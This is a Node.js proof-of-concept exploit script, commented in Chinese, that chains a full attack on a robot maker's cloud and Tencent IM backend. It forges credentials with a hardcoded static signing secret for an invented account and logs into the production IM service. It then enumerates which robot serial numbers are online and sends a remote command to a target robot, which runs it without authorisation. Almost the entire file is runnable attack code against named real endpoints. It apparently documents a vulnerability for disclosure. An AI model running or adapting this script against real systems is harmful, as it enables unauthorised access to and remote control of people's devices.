// run_full_chain.js — 一键全链复现：伪造凭据 → 登录 → 枚举 → 远控查询电量
// 用法: node run_full_chain.js <robotSN>
//   全程无需任何账号；攻击者身份为现场捏造的随机 IM 账号。
require('./shim');
const TIM = require('tim-js-sdk');
const https = require('https');
const crypto = require('crypto');

const SDKAPPID = 1400032988; // MINIEDUCN 租户
const ATTACKER = 'sigvoid_demo_' + Math.random().toString(36).slice(2, 10); // 现场捏造，从未注册

function httpGetJson(url) {
  return new Promise((resolve, reject) => {
    https.get(url, res => {
      let b = ''; res.on('data', d => b += d);
      res.on('end', () => { try { resolve(JSON.parse(b)); } catch (e) { reject(e); } });
    }).on('error', reject);
  });
}

function mintUserSig(userId) {
  const t = Date.now().toString();
  const sig = crypto.createHash('md5').update('IM$SeCrET' + t).digest('hex');
  console.log(`\n[步骤1] GET apis.ubtrobot.com/im/getInfo  (静态密钥 MD5("IM$SeCrET"+time))`);
  console.log(`        userId=${userId}  ← 现场捏造，从未注册`);
  return httpGetJson(`https://apis.ubtrobot.com/im/getInfo?signature=${sig}&time=${t}&userId=${encodeURIComponent(userId)}&channel=MINIEDUCN`);
}

function isOnline(accounts) {
  const t = Date.now().toString();
  const sig = crypto.createHash('md5').update('IM$SeCrET' + t).digest('hex');
  return httpGetJson(`https://apis.ubtrobot.com/im/isOnline?signature=${sig}&time=${t}&userId=${ATTACKER}&accounts=${accounts.join(',')}&channel=MINIEDUCN`);
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

(async () => {
  const robotSN = process.argv[2];
  if (!robotSN) { console.error('usage: node run_full_chain.js <robotSN>'); process.exit(1); }

  // 步骤1：伪造 userSig
  const info = await mintUserSig(ATTACKER);
  console.log(`        响应 returnCode=${info.returnCode}  SDKAppID=${info.returnMap.appidAt3rd}`);
  console.log(`        userSig=${info.returnMap.userSig.slice(0, 46)}...  ← 云端对不存在账号照签`);

  // 步骤2：登录腾讯 IM
  const tim = TIM.create({ SDKAppID: SDKAPPID });
  tim.setLogLevel(0);
  let readyResolve; const ready = new Promise(r => readyResolve = r);
  tim.on(TIM.EVENT.SDK_READY, () => readyResolve());
  let reply = null;
  tim.on(TIM.EVENT.MESSAGE_RECEIVED, e => { e.data.forEach(m => { reply = m; }); });
  const login = await tim.login({ userID: <账户_01>, userSig: info.returnMap.userSig });
  console.log(`\n[步骤2] 腾讯 IM 登录: actionStatus=${login.data.actionStatus}  tinyID=${login.data.tinyID}`);
  console.log(`        ⇒ 伪造身份已被腾讯 IM 生产环境接受`);
  await Promise.race([ready, sleep(8000)]);

  // 步骤3：在线状态枚举（20 个一串，含 18 个无效对照）
  const probes = [robotSN, ...Array.from({ length: 19 }, (_, i) => `<其他机器人设备_01>${String(i).padStart(3, '0')}`)];
  const ol = await isOnline(probes);
  console.log(`\n[步骤3] im/isOnline 批量枚举(${probes.length}个/次): 目标 ${robotSN} -> ${ol.returnMap[robotSN]}，其余无效 SN 全部为空`);
  console.log(`        ⇒ 三态预言机成立（Online/Offline/不存在），可扫描全网在线设备`);

  // 步骤4：远控 cmd 68 查电量
  const header = [0x08, 68, 0x10, 1, 0x18, 42];
  const payload = String.fromCharCode(0x0a, header.length, ...header, 0x12, 0x00);
  const msg = tim.createCustomMessage({ to: robotSN, conversationType: TIM.TYPES.CONV_C2C, payload: { data: payload, description: '', extension: '' } });
  const sent = await tim.sendMessage(msg);
  console.log(`\n[步骤4] C2C 投递 cmd 68(查询电量): status=${sent.data.message.status}（无关系链校验）`);
  console.log(`        等待机器人执行并回包...`);
  for (let i = 0; i < 20 && !reply; i++) await sleep(1000);

  if (reply) {
    const raw = reply.payload && reply.payload.data || '';
    const asciiRuns = (raw.match(/[\x20-\x7e]{3,}/g) || []).join(' | ');
    const codes = [...raw].map(c => c.charCodeAt(0));
    const battIdx = codes.findIndex((c, i) => c === 0x10 && i > 10);
    const batt = battIdx > 0 ? codes[battIdx + 1] : null;
    console.log(`\n[!!!] 机器人回包 from=${reply.from}`);
    console.log(`        可打印内容: ${asciiRuns}`);
    if (batt !== null) console.log(`        解码: 电量=${batt}%  固件=${(raw.match(/v[\d.]+/) || ['?'])[0]}`);
    console.log(`\n[结论] 陌生账号 → 云端伪造凭据 → 腾讯 IM → 机器人零校验执行 → 回包。全链闭环。`);
  } else {
    console.log(`\n[i] 20s 内未收到回包（机器人可能离线或忙碌）`);
  }
  try { await tim.logout(); } catch (e) {}
  process.exit(0);
})().catch(e => { console.error('[-] 失败:', e.code || '', e.message); process.exit(2); });
